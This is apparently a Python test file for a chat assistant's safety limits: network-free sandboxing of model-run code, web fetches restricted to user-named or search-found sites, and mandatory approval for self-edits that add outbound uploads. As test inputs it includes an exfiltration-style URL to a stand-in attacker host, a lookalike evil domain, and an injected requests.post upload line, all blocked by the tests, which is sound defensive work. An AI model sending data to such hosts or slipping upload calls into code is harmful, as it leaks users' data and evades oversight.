"""The limits on what a chat model can reach: code it runs has no network,
web requests go only to sites the person named or a search found, and a
self-edit that reaches outside the machine always asks."""
from backend.services import code_sandbox, web_provenance


# --- code the model runs -------------------------------------------------

def test_network_allowed_runs_the_command_unchanged(monkeypatch):
    monkeypatch.setattr(code_sandbox, "network_allowed", lambda: True)
    assert code_sandbox.wrap(["python3", "x.py"]) == (["python3", "x.py"], None)


def test_without_network_the_command_runs_in_a_network_namespace(monkeypatch):
    monkeypatch.setattr(code_sandbox, "network_allowed", lambda: False)
    monkeypatch.setattr(code_sandbox, "_bwrap", lambda: "/usr/bin/bwrap")
    command, refused = code_sandbox.wrap(["python3", "x.py"])
    assert refused is None
    assert command[0] == "/usr/bin/bwrap" and "--unshare-net" in command
    assert command[-2:] == ["python3", "x.py"]


def test_without_a_sandbox_the_code_is_not_run(monkeypatch):
    monkeypatch.setattr(code_sandbox, "network_allowed", lambda: False)
    monkeypatch.setattr(code_sandbox, "_bwrap", lambda: None)
    command, refused = code_sandbox.wrap(["node", "x.js"])
    assert command is None
    assert "Settings" in refused


# --- web requests ---------------------------------------------------------

def _chat(message, session_id=None):
    return {"transport": "chat", "chat_session_id": session_id, "user_message": message}


def test_a_named_site_and_its_subdomains_may_be_fetched():
    ctx = _chat("Check https://www.example.com/pricing and docs.python.org please")
    assert web_provenance.refusal(ctx, "https://example.com/about") is None
    assert web_provenance.refusal(ctx, "https://sub.example.com/") is None
    assert web_provenance.refusal(ctx, "https://docs.python.org/3/") is None


def test_an_unnamed_site_is_refused():
    ctx = _chat("Summarise the page I sent")
    assert web_provenance.refusal(ctx, "https://attacker.example/?q=secret")
    assert web_provenance.refusal(_chat("see example.com"), "https://example.com.evil.net/")


def test_a_site_a_search_found_may_be_fetched():
    web_provenance.note_search_results("s-search", ["https://news.ycombinator.com/item?id=1"])
    assert web_provenance.refusal(_chat("what is new?", "s-search"), "https://news.ycombinator.com/") is None
    assert web_provenance.refusal(_chat("what is new?", "s-other"), "https://news.ycombinator.com/")


def test_calls_from_outside_a_chat_are_not_limited():
    assert web_provenance.refusal({"transport": "mcp"}, "https://anything.example/") is None
    assert web_provenance.refusal(None, "https://anything.example/") is None


# --- self-edits that reach outside ----------------------------------------

def test_a_self_edit_adding_an_upload_always_asks(monkeypatch, tmp_path):
    from backend.services import agent_tools, self_edit
    from backend.tools.agent_tools.code_manipulation_tools import EditCodeTool

    target = tmp_path / "backend" / "thing.py"
    target.parent.mkdir(parents=True)
    target.write_text("import hashlib\n")
    monkeypatch.setattr(self_edit, "repo_root", lambda: tmp_path)
    params = {"filepath": str(target), "old_text": "import hashlib\n",
              "new_text": 'import hashlib\nimport requests\nrequests.post("https://uploads.example-bucket.cn/u")\n'}
    tool = EditCodeTool()
    assert tool.always_ask(params)
    assert agent_tools.tool_needs_approval_card(tool, "edit_code", params, preapproved={"edit_code"})


def test_a_harmless_self_edit_does_not_force_a_card(monkeypatch, tmp_path):
    from backend.services import agent_tools, self_edit
    from backend.tools.agent_tools.code_manipulation_tools import EditCodeTool

    target = tmp_path / "backend" / "thing.py"
    target.parent.mkdir(parents=True)
    target.write_text("import hashlib\n")
    monkeypatch.setattr(self_edit, "repo_root", lambda: tmp_path)
    params = {"filepath": str(target), "old_text": "import hashlib\n", "new_text": "import hashlib\nimport math\n"}
    tool = EditCodeTool()
    assert tool.always_ask(params) is None
    assert not agent_tools.tool_needs_approval_card(tool, "edit_code", params, preapproved={"edit_code"})
